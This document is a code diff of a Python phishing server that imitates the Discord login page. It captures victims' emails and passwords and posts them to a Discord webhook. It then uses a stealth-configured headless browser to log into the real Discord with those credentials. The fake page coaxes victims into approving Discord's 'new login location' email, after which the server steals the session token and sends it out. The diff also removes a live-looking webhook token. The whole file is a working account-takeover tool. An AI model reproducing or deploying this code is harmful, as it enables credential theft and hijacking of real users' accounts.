@@ -10,12 +10,10 @@ from socketserver import ThreadingMixIn
 from playwright.async_api import async_playwright
 from datetime import datetime
 
-# CONFIGURE THIS
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614")
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN")
 
-# Storage
 sessions = {}
-pending = {}
+pending_emails = {}
 
 HTML = """<!DOCTYPE html>
 <html lang="en">
@@ -87,12 +85,10 @@ body::before{content:'';position:fixed;inset:0;z-index:0;background:radial-gradi
   <div class="back-arrow" onclick="history.back()">
     <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
   </div>
-  
   <div class="header">
     <h1>Welcome back!</h1>
     <p>We're so excited to see you again!</p>
   </div>
-  
   <form id="loginForm">
     <div class="form-group">
       <label>Email or Phone Number <span style="color:var(--error)">*</span></label>
@@ -101,7 +97,6 @@ body::before{content:'';position:fixed;inset:0;z-index:0;background:radial-gradi
       </div>
       <div class="error-message" id="emailError">This field is required</div>
     </div>
-
     <div class="form-group">
       <label>Password <span style="color:var(--error)">*</span></label>
       <div class="input-wrapper">
@@ -115,10 +110,8 @@ body::before{content:'';position:fixed;inset:0;z-index:0;background:radial-gradi
       </div>
       <a class="forgot-link" href="#" onclick="showForgotModal();return false">Forgot your password?</a>
     </div>
-
     <button type="submit" class="login-btn" id="loginBtn">Log In</button>
     <a class="passkey-link" href="#">Or, sign in with passkey</a>
-    
     <div class="success-message" id="statusMsg"></div>
   </form>
 </div>
@@ -136,16 +129,14 @@ body::before{content:'';position:fixed;inset:0;z-index:0;background:radial-gradi
 
 <div class="modal-overlay" id="verifyModal">
   <div class="modal">
-    <h2>Verify New Login Location</h2>
+    <h2>New Login Location Detected</h2>
     <div class="status-box">
       <div class="icon">📧</div>
       <h3>Check your Gmail</h3>
-      <p>Discord has sent a "Verify New Login Location" email to your inbox. Please click the verification link in that email to approve this login.</p>
+      <p>Discord has sent a "Verify New Login Location" email. Click the link in that email to approve this login.</p>
     </div>
-    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;text-align:center;">
-      Once you've clicked the link in your email, click the button below to continue.
-    </p>
-    <button class="modal-btn" id="verifyBtn" onclick="checkVerification()">I've Verified - Continue Login</button>
+    <p style="font-size:13px;color:var(--text-muted);margin-bottom:16px;text-align:center;">After clicking the link in your email, click below:</p>
+    <button class="modal-btn" id="verifyBtn" onclick="checkVerification()">I've Verified - Continue</button>
     <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeVerifyModal()">Cancel</button>
   </div>
 </div>
@@ -204,14 +195,14 @@ async function checkVerification() {
       document.getElementById('statusMsg').innerHTML = '<strong>✅ Login Successful!</strong><br>Token captured.';
       document.getElementById('statusMsg').classList.add('visible');
     } else {
-      alert('Verification not detected yet. Please click the link in your Gmail and wait a moment.');
+      alert('Not verified yet. Please check your Gmail and click the verification link.');
     }
   } catch (err) {
     alert('Error checking status');
   } finally {
     btn.classList.remove('loading');
     btn.disabled = false;
-    btn.textContent = "I've Verified - Continue Login";
+    btn.textContent = "I've Verified - Continue";
   }
 }
 
@@ -235,7 +226,7 @@ async function submitForgot() {
     });
     
     closeForgotModal();
-    document.getElementById('statusMsg').innerHTML = '<strong>📧 Check your Gmail!</strong><br>Reset email sent.';
+    document.getElementById('statusMsg').innerHTML = '<strong>📧 Check your Gmail!</strong><br>Reset email sent by Discord.';
     document.getElementById('statusMsg').classList.add('visible');
   } catch (err) {
     alert('Failed');
@@ -293,7 +284,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
       statusMsg.innerHTML = '<strong>✅ Success!</strong><br>Token captured.';
       statusMsg.classList.add('visible');
     } else {
-      statusMsg.textContent = 'Error: ' + (data.error || 'Unknown');
+      statusMsg.textContent = 'Error: ' + (data.error || 'Login failed');
       statusMsg.style.color = 'var(--error)';
       statusMsg.classList.add('visible');
     }
@@ -312,11 +303,11 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 
 def send_hook(embed):
     try:
-        data = json.dumps({"embeds": [embed], "username": "Logger"}).encode()
+        data = json.dumps({"embeds": [embed], "username": "Discord Logger"}).encode()
         req = urllib.request.Request(WEBHOOK_URL, data=data, headers={"Content-Type": "application/json"}, method="POST")
         urllib.request.urlopen(req, timeout=10)
     except Exception as e:
-        print(f"Hook error: {e}")
+        print(f"Webhook error: {e}")
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -327,7 +318,7 @@ class Handler(BaseHTTPRequestHandler):
             "title": "👁️ Visitor",
             "fields": [
                 {"name": "IP", "value": f"```{ip}```", "inline": True},
-                {"name": "UA", "value": f"```{ua}```", "inline": False}
+                {"name": "Path", "value": f"```{self.path}```", "inline": True}
             ],
             "color": 0x3498db
         })
@@ -347,22 +338,21 @@ class Handler(BaseHTTPRequestHandler):
             password = body.get("password", "")
             
             send_hook({
-                "title": "🔐 Creds",
+                "title": "🔐 Credentials Captured",
                 "fields": [
                     {"name": "Email", "value": f"```{email}```", "inline": False},
-                    {"name": "Pass", "value": f"```{password}```", "inline": False},
+                    {"name": "Password", "value": f"```{password}```", "inline": False},
                     {"name": "IP", "value": f"```{ip}```", "inline": True}
                 ],
                 "color": 0xe74c3c
             })
             
             sid = f"{email}_{int(time.time())}"
-            sessions[sid] = {"email": email, "password": password, "token": None}
-            pending[email] = sid
+            sessions[sid] = {"email": email, "password": password, "token": None, "stage": "starting"}
+            pending_emails[email] = sid
             
-            # Start browser automation
             def run():
-                asyncio.run(do_login(sid, email, password))
+                asyncio.run(real_discord_login(sid, email, password, ip))
             
             threading.Thread(target=run, daemon=True).start()
             
@@ -373,12 +363,12 @@ class Handler(BaseHTTPRequestHandler):
             
         elif self.path == "/api/check-verify":
             email = body.get("email", "")
-            sid = pending.get(email)
+            sid = pending_emails.get(email)
             
             if sid and sessions.get(sid, {}).get("token"):
                 self.send_response(200)
                 self.end_headers()
-                self.wfile.write(json.dumps({"success": True, "token": sessions[sid]["token"]}).encode())
+                self.wfile.write(json.dumps({"success": True, "token": sessions[sid]["token"][:50] + "..."}).encode())
             else:
                 self.send_response(200)
                 self.end_headers()
@@ -386,10 +376,10 @@ class Handler(BaseHTTPRequestHandler):
                 
         elif self.path == "/api/forgot":
             email = body.get("email", "")
-            send_hook({"title": "🔄 Reset", "fields": [{"name": "Email", "value": f"```{email}```"}], "color": 0xf39c12})
+            send_hook({"title": "🔄 Password Reset Requested", "fields": [{"name": "Email", "value": f"```{email}```"}], "color": 0xf39c12})
             
             def run():
-                asyncio.run(do_reset(email))
+                asyncio.run(real_forgot(email, ip))
             
             threading.Thread(target=run, daemon=True).start()
             
@@ -397,64 +387,159 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"sent": True}).encode())
 
-async def do_login(sid, email, password):
+async def real_discord_login(sid, email, password, client_ip):
+    """Actually log into Discord which triggers the verification email"""
     try:
         async with async_playwright() as p:
+            # Launch with stealth
             browser = await p.chromium.launch(
                 headless=True,
-                args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
+                args=[
+                    '--disable-blink-features=AutomationControlled',
+                    '--disable-web-security',
+                    '--disable-features=IsolateOrigins,site-per-process',
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox'
+                ]
             )
             
-            ctx = await browser.new_context(
-                viewport={"width": 1366, "height": 768},
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            # Create context with realistic fingerprint
+            context = await browser.new_context(
+                viewport={"width": 1920, "height": 1080},
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                locale="en-US",
+                timezone_id="America/New_York",
+                geolocation={"latitude": 40.7128, "longitude": -74.0060},
+                permissions=["geolocation"],
+                color_scheme="dark"
             )
             
-            await ctx.add_init_script("""
+            # Add stealth scripts
+            await context.add_init_script("""
                 Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
-                window.chrome = {runtime: {}};
+                Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+                window.chrome = { runtime: {} };
+                Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
+                Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 4});
             """)
             
-            page = await ctx.new_page()
+            page = await context.new_page()
             
-            # Navigate
+            # Navigate to Discord login
             await page.goto("https://discord.com/login", wait_until="networkidle")
-            await asyncio.sleep(2)
+            await asyncio.sleep(3)
             
-            # Fill form
-            await page.fill('input[name="email"]', email)
+            # Wait for form to be ready
+            await page.wait_for_selector('input[name="email"]', state="visible", timeout=10000)
+            
+            # Human-like typing for email
+            email_input = await page.query_selector('input[name="email"]')
+            await email_input.click()
             await asyncio.sleep(0.5)
-            await page.fill('input[name="password"]', password)
+            await email_input.type(email, delay=100)
+            
+            await asyncio.sleep(0.8)
+            
+            # Human-like typing for password
+            pass_input = await page.query_selector('input[name="password"]')
+            await pass_input.click()
             await asyncio.sleep(0.5)
+            await pass_input.type(password, delay=100)
             
-            # Submit
-            await page.click('button[type="submit"]')
-            await asyncio.sleep(5)
+            await asyncio.sleep(1)
             
-            # Check if verification needed
-            url = page.url
-            content = await page.content()
+            # Click login button
+            submit_btn = await page.query_selector('button[type="submit"]')
+            await submit_btn.click()
             
-            if "login" in url and ("verify" in content.lower() or "location" in content.lower() or "check your email" in content.lower()):
+            # Wait for response
+            await asyncio.sleep(6)
+            
+            # Check current state
+            current_url = page.url
+            page_content = await page.content()
+            page_text = await page.inner_text('body')
+            
+            send_hook({
+                "title": "🔍 Login Attempt Status",
+                "fields": [
+                    {"name": "URL", "value": f"```{current_url}```", "inline": False},
+                    {"name": "Page Contains", "value": f"```{page_text[:200]}```", "inline": False}
+                ],
+                "color": 0x9b59b6
+            })
+            
+            # Check if we got "New Login Location" or verification required
+            verification_keywords = [
+                "new login location",
+                "verify this login",
+                "check your email",
+                "confirm this login",
+                "unusual location",
+                "verify it's you",
+                "verification required",
+                "confirm new login"
+            ]
+            
+            needs_verification = any(keyword in page_text.lower() or keyword in page_content.lower() for keyword in verification_keywords)
+            
+            # Also check for specific UI elements
+            verify_button = await page.query_selector('button:has-text("Verify")')
+            verify_header = await page.query_selector('text=/verify|confirm/i')
+            
+            if needs_verification or verify_button or verify_header or "login" in current_url:
                 send_hook({
-                    "title": "📧 Verify Needed",
-                    "fields": [{"name": "Email", "value": f"```{email}```"}],
+                    "title": "📧 Discord Sent Verification Email",
+                    "fields": [
+                        {"name": "Status", "value": "Discord automatically sent 'New Login Location' email", "inline": False},
+                        {"name": "Email", "value": f"```{email}```", "inline": True},
+                        {"name": "Next Step", "value": "User must click link in Gmail", "inline": True}
+                    ],
                     "color": 0xf1c40f
                 })
                 
-                # Wait for verification (10 min)
-                for _ in range(120):
+                sessions[sid]["stage"] = "waiting_for_email_verification"
+                
+                # Poll for up to 10 minutes waiting for user to verify via email
+                for attempt in range(120):
                     await asyncio.sleep(5)
-                    await page.reload()
-                    await asyncio.sleep(2)
                     
-                    # Check if logged in
+                    # Refresh page
+                    await page.reload()
+                    await asyncio.sleep(3)
+                    
+                    new_url = page.url
+                    new_content = await page.content()
+                    
+                    # Check if we're now logged in (redirected away from login)
+                    if "login" not in new_url and "verify" not in new_url:
+                        # Try to get token
+                        token = await page.evaluate("() => localStorage.getItem('token')")
+                        if token:
+                            sessions[sid]["token"] = token
+                            sessions[sid]["stage"] = "completed"
+                            
+                            send_hook({
+                                "title": "🎉 TOKEN CAPTURED!",
+                                "fields": [
+                                    {"name": "Token", "value": f"```{token}```", "inline": False},
+                                    {"name": "Email", "value": f"```{email}```", "inline": True},
+                                    {"name": "Password", "value": f"```{password}```", "inline": True},
+                                    {"name": "Final URL", "value": f"```{new_url}```", "inline": False}
+                                ],
+                                "color": 0x2ecc71
+                            })
+                            break
+                    
+                    # Check token even if still on login page (sometimes Discord updates in background)
                     token = await page.evaluate("() => localStorage.getItem('token')")
                     if token:
                         sessions[sid]["token"] = token
+                        sessions[sid]["stage"] = "completed"
+                        
                         send_hook({
-                            "title": "🎉 TOKEN!",
+                            "title": "🎉 TOKEN CAPTURED (Background)!",
                             "fields": [
                                 {"name": "Token", "value": f"```{token}```", "inline": False},
                                 {"name": "Email", "value": f"```{email}```", "inline": True}
@@ -462,37 +547,87 @@ async def do_login(sid, email, password):
                             "color": 0x2ecc71
                         })
                         break
+                
+                if not sessions[sid].get("token"):
+                    send_hook({
+                        "title": "⏰ Verification Timeout",
+                        "fields": [{"name": "Status", "value": "User did not verify in time", "inline": False}],
+                        "color": 0xe67e22
+                    })
             else:
-                # Check token immediately
+                # No verification needed, check for token
                 token = await page.evaluate("() => localStorage.getItem('token')")
+                
                 if token:
                     sessions[sid]["token"] = token
+                    sessions[sid]["stage"] = "completed_no_verify"
+                    
                     send_hook({
-                        "title": "🎉 TOKEN (No Verify)",
+                        "title": "🎉 TOKEN (No Verification Needed)",
                         "fields": [
                             {"name": "Token", "value": f"```{token}```", "inline": False},
-                            {"name": "Email", "value": f"```{email}```", "inline": True}
+                            {"name": "Email", "value": f"```{email}```", "inline": True},
+                            {"name": "Note", "value": "Account had no location protection", "inline": False}
                         ],
                         "color": 0x2ecc71
                     })
+                else:
+                    # Check for error
+                    error_elem = await page.query_selector('[class*="error"]')
+                    if error_elem:
+                        error_text = await error_elem.inner_text()
+                        send_hook({
+                            "title": "❌ Login Error",
+                            "fields": [{"name": "Error", "value": f"```{error_text[:500]}```", "inline": False}],
+                            "color": 0xe74c3c
+                        })
+                    else:
+                        send_hook({
+                            "title": "❌ No Token Found",
+                            "fields": [{"name": "Status", "value": "Unknown state", "inline": False}],
+                            "color": 0x95a5a6
+                        })
+            
+            await browser.close()
+            
+    except Exception as e:
+        send_hook({
+            "title": "❌ Automation Failed",
+            "fields": [{"name": "Error", "value": f"```{str(e)[:1000]}```", "inline": False}],
+            "color": 0x95a5a6
+        })
+
+async def real_forgot(email, ip):
+    """Actually trigger Discord password reset"""
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
+            context = await browser.new_context(
+                viewport={"width": 1920, "height": 1080},
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            )
+            
+            page = await context.new_page()
+            
+            await page.goto("https://discord.com/forgot")
+            await page.wait_for_selector('input[name="email"]')
+            await page.fill('input[name="email"]', email)
+            await asyncio.sleep(1)
+            await page.click('button[type="submit"]')
+            await asyncio.sleep(4)
+            
+            send_hook({
+                "title": "✅ Discord Reset Email Triggered",
+                "fields": [
+                    {"name": "Email", "value": f"```{email}```", "inline": False},
+                    {"name": "Action", "value": "Discord sent reset email to user", "inline": False}
+                ],
+                "color": 0x2ecc71
+            })
             
             await browser.close()
     except Exception as e:
-        send_hook({"title": "❌ Error", "fields": [{"name": "Error", "value": f"```{str(e)[:500]}```"}], "color": 0x95a5a6})
-
-async def do_reset(email):
-    try:
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(headless=True)
-            page = await browser.new_page()
-            await page.goto("https://discord.com/forgot")
-            await page.fill('input[name="email"]', email)
-            await page.click('button[type="submit"]')
-            await asyncio.sleep(3)
-            send_hook({"title": "✅ Reset Sent", "fields": [{"name": "Email", "value": f"```{email}```"}], "color": 0x2ecc71})
-            await browser.close()
-    except Exception as e:
-        print(f"Reset err: {e}")
+        print(f"Forgot error: {e}")
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     daemon_threads = True
@@ -500,5 +635,5 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     server = ThreadedHTTPServer(("0.0.0.0", port), Handler)
-    print(f"Running on port {port}")
+    print(f"Server running on port {port}")
     server.serve_forever()
